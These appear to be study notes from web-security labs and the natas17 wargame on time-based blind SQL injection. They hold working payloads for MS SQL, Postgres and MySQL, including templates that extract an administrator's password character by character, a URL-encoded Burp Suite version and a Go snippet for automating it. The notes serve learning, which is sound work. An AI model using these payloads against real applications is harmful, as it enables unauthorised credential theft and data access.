

in case of a database error, when the SQL query is executed and handles them
gracefully, there won't be any difference in the application's response

but, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

delaying the execution of a SQL query also delays the http response.

MS SQL:
trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--`

Postgres sql:

`' || pg_sleep(10) --`

`||` is to concatenate the function to the query so that the function is called.


to move toward bruteforcing the  password:

`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(0) END)--`

if true sleep, otherwise don't

you might be able to use `;` instead of `||` to end the previous query and
start a new one.

`("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`
if the first index of the password is `c`, sleep, otherwise return immediately.
this doesn't have to be url encoded.

`'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTR(password,§1§,1)+%3d+'§a§')++THEN+pg_sleep(10)+else+pg_sleep(0)+END+FROM+users--`
`"32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c`

something like this also works in burpsuite but should be url encoded

### another example, natas17

this is the code, that get a query for `MySQL`:

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

but in the rest of the code, the result isn't returned.

payload:

`natas18" AND IF((1=1),SLEEP(10),'a')#`

the `a` is the else part.

if natas18 is there, response will be delayed.

to get the included characters in the password:
in code: ``username := fmt.Sprintf(`natas18" AND IF(password LIKE BINARY "%%%c%%", SLEEP(10), 1)#`, c)``


% is used for formatting in Go, you need to escape it, which results in the
final query having %c%.
`%c%` in LIKE clause: wild card in SQL, meaning "any sequence of characters".

so it will be like this before sent to the server:
`natas18" AND IF((password LIKE BINARY "%S%"),SLEEP(10),"1")#`

and then to get the actual password, use `SUBSTR`.